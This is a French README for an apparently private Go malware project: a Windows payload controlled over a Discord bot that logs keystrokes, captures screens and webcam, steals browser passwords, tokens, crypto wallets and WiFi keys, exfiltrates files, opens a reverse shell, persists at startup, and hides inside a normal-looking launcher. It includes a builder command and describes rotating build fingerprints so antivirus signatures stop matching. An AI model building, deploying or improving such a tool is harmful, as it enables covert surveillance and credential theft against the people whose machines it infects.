# payload-builder

Payload Windows en Go (module autonome) + **builder en ligne de commande**.

Un binaire, aucune dépendance : C2 Discord par commandes `!`, journal clavier
temps réel, captures d'écran multi-écrans, photos et vidéos de webcam,
extraction des navigateurs (Chromium + Firefox), WiFi, géolocalisation,
fichiers par type, persistance au démarrage, retrait complet.

Ce dépôt ne contient **que du code source**. `payload.example.json` est vierge
(aucun jeton, aucun identifiant Discord) ; `payload.json` et `payload.enc` sont
gitignorés — la configuration réelle ne quitte jamais la machine de l'opérateur.

## Organisation

| Fichier | Rôle |
|---|---|
| `main.go` | Hôte autonome : instance unique, `-diag`, `startPayload()` |
| `payload.go` | Configuration chiffrée, cadences, transport Discord, journaux |
| `channel.go` | Catégorie par machine + salons `-keylogs`, `-screenshots`, `-webcam`, `-files-*` |
| `c2.go` | Commandes `!` et reverse shell |
| `c2out.go` | Sortie cmd/PowerShell complète, UTF-8 + repli OEM, pièce jointe si longue |
| `menu.go` | Bandeau d'état (en ligne / hors ligne) + menu par réactions |
| `keylogger.go` | Crochet clavier bas niveau + presse-papiers, flux 5 s |
| `screenshot.go` / `media.go` | Capture GDI par moniteur, agrandissement ×1-×3, envoi |
| `webcam.go` / `mjpeg_avi.go` | Photo WinRT sans dépendance ; vidéo AVI MJPEG écrite à la main |
| `stealer.go` / `firefox.go` | DPAPI, bases Chromium et Firefox, jetons, portefeuilles, rapport machine |
| `fileexfil.go` / `bulk.go` | Veille temps réel des dossiers + extraction initiale massive |
| `fileops.go` | Recherche, zip, upload URL, exec, suppression, arrêt machine, captures programmées |
| `wifi.go` | Profils WiFi et clés en clair (netsh FR/EN) |
| `location.go` | Position Windows, bornes Wi-Fi (BeaconDB), adresse (Nominatim) |
| `apps.go` | Processus avec chemins, ouverture, fermeture, kill |
| `prank.go` | Effets réversibles (message, fond d'écran, rotation, volume…) |
| `persist.go` / `wipe.go` | Ancrages de démarrage, réparation, nettoyage des builds, `!delete` |
| `hardware.go` | CPU, RAM, disques, GPU, écrans |
| `defender.go` | État de Defender et exclusions (admin requis) |
| `cmd/builder` | Builder CLI |
| `cmd/seal` | Chiffre `payload.json` → `payload.enc` (AES-256-GCM) |
| `cmd/cover` | Lanceur d'apparence normale qui embarque le payload |

## Compiler

```bat
go run ./cmd/builder -bot-token "VOTRE_JETON" -guild ID_SERVEUR -channel ID_SALON -out app.exe
```

Le builder écrit `payload.json`, le chiffre dans `payload.enc` puis lance :

```bat
go build -ldflags "-H windowsgui -s -w -buildid=" -o app.exe .
```

`build.ps1` fait la même chose avec des empreintes renouvelées à chaque build
(valeur Run, nom du miroir, dossier de travail, mutex) : ce que l'antivirus a
mémorisé ne correspond plus à rien au build suivant.

## Utilisation

1. Lancer l'exécutable : une catégorie au nom de la machine apparaît dans le
   serveur Discord, avec ses salons.
2. Le bandeau du salon principal affiche l'état, l'utilisateur, les IP et la
   persistance. Six réactions y servent de boutons.
3. Taper une commande dans le salon de la machine (`!help` pour la liste).

Les résultats des commandes reviennent dans le salon de commande ; les
captures automatiques, la webcam et les fichiers vont dans leurs salons dédiés.

## Cadences par défaut

| Tâche | Période |
|---|---|
| journal clavier | 5 s |
| captures d'écran | 20 s |
| webcam | 1 min |
| logs locaux | 10 min |
| extraction navigateurs | 24 h |

## Configuration

`payload.example.json` documente chaque champ : jeton de bot, serveur, salon de
repli, hôte de reverse shell, cadences, persistance, échelle des captures.

## Licence

Usage privé. Aucune garantie.
